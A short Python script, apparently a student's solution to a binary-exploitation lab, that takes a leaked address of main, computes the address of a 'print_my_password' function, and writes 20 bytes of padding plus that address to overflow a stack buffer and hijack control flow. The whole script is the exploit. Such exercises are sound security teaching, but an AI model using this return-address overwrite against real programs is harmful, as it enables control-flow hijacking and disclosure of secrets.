#!/usr/bin/env python3
import sys
import struct

# make sure to use these functions to write strings or bytes (bytestring) so that the order is preserved
def writeStr(v):
    assert isinstance(v, str)
    sys.stdout.flush()
    sys.stdout.buffer.write(v.encode("ascii"))
    sys.stdout.flush()

def writeBytes(v):
    assert isinstance(v, bytes)
    sys.stdout.flush()
    sys.stdout.buffer.write(v)
    sys.stdout.flush()

def writeLong(v):
    assert isinstance(v, int)
    sys.stdout.flush()
    sys.stdout.buffer.write(v.to_bytes(8, 'little'))
    sys.stdout.flush()

# Use this to debug your attack.
def eprint(*args, **kwargs):
    print(*args, file=sys.stderr, **kwargs)

# TODO: Implement your solution here.

#print(0x7fffffffdd68-0x7fffffffdd54)
#0x7ffff7fb4f80

mainadress = int(sys.stdin.readline(), 16)

adress_print_my_password = mainadress-151 # distance is 151

writeStr("a"*20) # distance is 20
writeLong(adress_print_my_password)